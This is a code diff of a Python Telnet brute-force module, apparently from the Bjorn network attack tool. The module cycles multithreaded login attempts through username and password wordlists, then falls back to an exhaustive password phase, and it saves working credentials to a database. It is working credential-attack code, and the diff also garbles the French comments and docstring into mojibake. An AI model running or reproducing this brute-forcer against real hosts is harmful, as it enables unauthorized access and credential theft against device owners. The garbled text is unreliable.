@@ -1,9 +1,9 @@
-"""
-telnet_bruteforce.py — Telnet bruteforce (DB-backed, no CSV/JSON, no rich)
-- Cibles: (ip, port) par l’orchestrateur
+﻿"""
+telnet_bruteforce.py â€” Telnet bruteforce (DB-backed, no CSV/JSON, no rich)
+- Cibles: (ip, port) par lâ€™orchestrateur
 - IP -> (MAC, hostname) via DB.hosts
-- Succès -> DB.creds (service='telnet')
-- Conserve la logique d’origine (telnetlib, queue/threads)
+- SuccÃ¨s -> DB.creds (service='telnet')
+- Conserve la logique dâ€™origine (telnetlib, queue/threads)
 """
 
 import os
@@ -15,6 +15,7 @@ from queue import Queue
 from typing import List, Dict, Tuple, Optional
 
 from shared import SharedData
+from actions.bruteforce_common import ProgressTracker, merged_password_plan
 from logger import Logger
 
 logger = Logger(name="telnet_bruteforce.py", level=logging.DEBUG)
@@ -43,20 +44,21 @@ class TelnetBruteforce:
         return self.telnet_bruteforce.run_bruteforce(ip, port)
 
     def execute(self, ip, port, row, status_key):
-        """Point d’entrée orchestrateur (retour 'success' / 'failed')."""
+        """Point d'entrÃ©e orchestrateur (retour 'success' / 'failed')."""
         logger.info(f"Executing TelnetBruteforce on {ip}:{port}")
         self.shared_data.bjorn_orch_status = "TelnetBruteforce"
+        self.shared_data.comment_params = {"user": "?", "ip": ip, "port": str(port)}
         success, results = self.bruteforce_telnet(ip, port)
         return 'success' if success else 'failed'
 
 
 class TelnetConnector:
-    """Gère les tentatives Telnet, persistance DB, mapping IP→(MAC, Hostname)."""
+    """GÃ¨re les tentatives Telnet, persistance DB, mapping IPâ†’(MAC, Hostname)."""
 
     def __init__(self, shared_data):
         self.shared_data = shared_data
 
-        # Wordlists inchangées
+        # Wordlists inchangÃ©es
         self.users = self._read_lines(shared_data.users_file)
         self.passwords = self._read_lines(shared_data.passwords_file)
 
@@ -67,6 +69,7 @@ class TelnetConnector:
         self.lock = threading.Lock()
         self.results: List[List[str]] = []  # [mac, ip, hostname, user, password, port]
         self.queue = Queue()
+        self.progress = None
 
     # ---------- util fichiers ----------
     @staticmethod
@@ -110,9 +113,10 @@ class TelnetConnector:
         return self._ip_to_identity.get(ip, (None, None))[1]
 
     # ---------- Telnet ----------
-    def telnet_connect(self, adresse_ip: str, user: str, password: str) -> bool:
+    def telnet_connect(self, adresse_ip: str, user: str, password: str, port: int = 23, timeout: int = 10) -> bool:
+        timeout = int(getattr(self.shared_data, "telnet_connect_timeout_s", timeout))
         try:
-            tn = telnetlib.Telnet(adresse_ip)
+            tn = telnetlib.Telnet(adresse_ip, port=port, timeout=timeout)
             tn.read_until(b"login: ", timeout=5)
             tn.write(user.encode('ascii') + b"\n")
             if password:
@@ -175,14 +179,17 @@ class TelnetConnector:
 
             adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
             try:
-                if self.telnet_connect(adresse_ip, user, password):
+                if self.telnet_connect(adresse_ip, user, password, port=port):
                     with self.lock:
                         self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                         logger.success(f"Found credentials  IP:{adresse_ip} | User:{user} | Password:{password}")
+                        self.shared_data.comment_params = {"user": user, "ip": adresse_ip, "port": str(port)}
                         self.save_results()
                         self.removeduplicates()
                         success_flag[0] = True
             finally:
+                if self.progress is not None:
+                    self.progress.advance(1)
                 self.queue.task_done()
 
                 # Optional delay between attempts
@@ -191,46 +198,54 @@ class TelnetConnector:
 
 
     def run_bruteforce(self, adresse_ip: str, port: int):
+        self.results = []
         mac_address = self.mac_for_ip(adresse_ip)
         hostname = self.hostname_for_ip(adresse_ip) or ""
 
-        total_tasks = len(self.users) * len(self.passwords)
+        dict_passwords, fallback_passwords = merged_password_plan(self.shared_data, self.passwords)
+        total_tasks = len(self.users) * (len(dict_passwords) + len(fallback_passwords))
         if total_tasks == 0:
             logger.warning("No users/passwords loaded. Abort.")
             return False, []
 
-        for user in self.users:
-            for password in self.passwords:
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                    return False, []
-                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
-
+        self.progress = ProgressTracker(self.shared_data, total_tasks)
         success_flag = [False]
-        threads = []
-        thread_count = min(40, max(1, total_tasks))
 
-        for _ in range(thread_count):
-            t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
-            t.start()
-            threads.append(t)
+        def run_phase(passwords):
+            phase_tasks = len(self.users) * len(passwords)
+            if phase_tasks == 0:
+                return
 
-        while not self.queue.empty():
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                while not self.queue.empty():
-                    try:
-                        self.queue.get_nowait()
-                        self.queue.task_done()
-                    except Exception:
-                        break
-                break
+            for user in self.users:
+                for password in passwords:
+                    if self.shared_data.orchestrator_should_exit:
+                        logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
+                        return
+                    self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
 
-        self.queue.join()
-        for t in threads:
-            t.join()
+            threads = []
+            thread_count = min(8, max(1, phase_tasks))
+            for _ in range(thread_count):
+                t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
+                t.start()
+                threads.append(t)
 
-        return success_flag[0], self.results
+            self.queue.join()
+            for t in threads:
+                t.join()
+
+        try:
+            run_phase(dict_passwords)
+            if (not success_flag[0]) and fallback_passwords and not self.shared_data.orchestrator_should_exit:
+                logger.info(
+                    f"Telnet dictionary phase failed on {adresse_ip}:{port}. "
+                    f"Starting exhaustive fallback ({len(fallback_passwords)} passwords)."
+                )
+                run_phase(fallback_passwords)
+            self.progress.set_complete()
+            return success_flag[0], self.results
+        finally:
+            self.shared_data.bjorn_progress = ""
 
     # ---------- persistence DB ----------
     def save_results(self):
@@ -270,3 +285,4 @@ if __name__ == "__main__":
     except Exception as e:
         logger.error(f"Error: {e}")
         exit(1)
+
